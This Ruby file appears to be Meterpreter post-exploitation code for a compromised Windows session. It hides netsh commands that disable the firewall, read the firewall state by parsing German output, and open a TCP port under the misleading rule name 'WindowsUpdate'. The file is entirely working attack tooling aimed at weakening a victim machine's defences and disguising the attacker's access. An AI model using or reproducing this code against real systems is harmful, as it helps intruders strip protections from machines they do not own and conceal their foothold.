def disable_firewall session, mode="DISABLE", exception = nil
    exception ||= mode
    read_state = session.sys.process.execute("cmd.exe /c netsh firewall set opmode #{mode} #{mode}", nil, {'Hidden' => 'true','Channelized' => true})
    config = ""
    result = {}
    while(d = read_state.channel.read)
    	if d =~ /The requested operation requires elevation./
    		result[:error] = "Couldn' disable Firewall"
    	else
    	    config << d
    	end
    end	
    read_state.channel.close
    read_state.close 1
end

def read_firewall_config session
  print_status("Getting Firewall Status")
    read_state = session.sys.process.execute("cmd.exe /c netsh firewall show state", nil, {'Hidden' => 'true','Channelized' => true})
    config = ""
    result = {}
    while(d = read_state.channel.read)
    	if d =~ /The requested operation requires elevation./
    		result[:error] = "Can't Read Firewall State"
    	else
    	    config << d
    	end
    end	
    read_state.channel.close
    read_state.close 1
    unless result[:error]
        result[:firewall_state] = "unknown"
        config.split("\n").each do |o|
          p o
          if (o.include? "Betriebsmodus")
            state = ""
            if o.include? "Inaktiv"
                state = "inactive"
            elsif o.include? "Aktiv"
                state = "active"                
            end
            result[:firewall_state] = state
          end
          if o.include? "TCP"
            result[:tcp] = [] unless result[:tcp]
            result[:tcp] << o.scan(/\d{1,5}/)
          elsif o.include? "UDP"
            result[:udp] = [] unless result[:udp]
            result[:udp] << o.scan(/\d{1,5}/)
          end
    	end
    end
    result[:tcp] = result[:tcp].flatten if result[:tcp]
    result[:udp] = result[:udp].flatten if result[:udp]
    result
end

def open_port session, port, rule_name = "WindowsUpdate"
    print_status("Opening Port ...")
    open_port = session.sys.process.execute("cmd.exe /c netsh firewall add portopening TCP #{port} #{rule_name}", nil, {'Hidden' => 'true','Channelized' => true})
    print_status("Wait for Response ...")
    result = {}
    while(d = open_port.channel.read)
		if d =~ /The requested operation requires elevation./
			result[:error] = "Couldn't Open port'"
		end
	end
	open_port.channel.close
	open_port.close 1#Was auch immer der Parameter macht
	result
end
